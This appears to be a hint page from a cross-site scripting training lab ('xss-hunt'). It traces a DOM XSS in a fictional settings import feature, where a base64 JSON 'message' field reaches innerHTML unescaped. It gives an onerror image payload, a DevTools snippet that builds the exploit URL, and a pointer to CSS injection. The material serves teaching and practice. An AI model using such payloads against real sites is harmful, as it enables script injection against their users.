Hint: WorkOS (Settings Import)

The settings page supports "importing" a shared config via URL. Look for how import or css params flow into the DOM.
1
Find applyParams›
Open settings-module.js. Look at handleRouting — it parses hash params in the form #settings/appearance?css=.... The css param goes straight into a <style> tag via style.textContent — NOT an XSS sink directly, but useful for CSS injection.
2
The import flow›
applyParams also handles import, calling showImportConfirmation(data). That function tries to base64-decode then JSON-parse the value, then builds HTML from the decoded object.
3
Find the sink› 
confirmDiv.innerHTML =
  '...' +
  (decoded.message ? '<div class="import-message">' + decoded.message + '</div>' : '') +
  '...';
decoded.message is interpolated raw. The other fields (JSON.stringify(decoded.settings)) are escape-safe.
4
Craft the import payload›
You need a JSON object with a settings key (required by the if check) and a message with your XSS: 
{
  "settings": {"theme": "dark"},
  "message": "<img src=x onerror=alert(1)>"
}
Base64-encode this, then URL-encode and pass as ?import=... or via hash #settings/general?import=....

In DevTools console on any page:

var payload = btoa(JSON.stringify({
  settings: {theme:'dark'},
  message: '<img src=x onerror=alert("IMPORT_XSS")>'
}));
location.href = '/labs/xss-hunt/hunt5-settings-import.html#settings/general?import=' + payload;

Flow: hash params → applyParams({import: ...}) → showImportConfirmation → base64 decode → JSON parse → builds HTML with decoded.message unescaped → img onerror fires.
